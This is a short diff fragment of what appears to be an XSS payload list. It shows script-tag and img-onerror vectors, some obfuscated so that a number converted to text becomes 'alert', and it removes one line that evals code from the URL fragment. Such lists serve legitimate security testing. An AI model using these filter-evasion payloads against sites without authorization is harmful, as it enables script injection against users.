@@ -69,4 +69,3 @@ top[8680439..toString(30)](1)
 <script>top[8680439..toString(30)](1)</script>
 <img src=x onerror=top[8680439..toString(30)](1)>
 "> <img src=x onerror=alert(1)>
-<img src=x onerror="eval(URL.slice(-8))>#alert(1)" >
